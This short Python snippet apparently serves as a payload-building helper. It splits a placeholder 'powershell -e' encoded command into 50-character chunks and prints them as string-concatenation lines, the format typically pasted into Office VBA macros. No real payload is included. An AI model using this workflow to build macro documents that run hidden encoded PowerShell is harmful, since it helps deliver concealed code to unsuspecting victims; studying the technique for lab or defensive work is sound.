str="powershell -e [paste the encoded string]"
n=50
for i in range(0,len(str),n):
    print("Str = str+" + '"' + str[i:i+n] +'"')
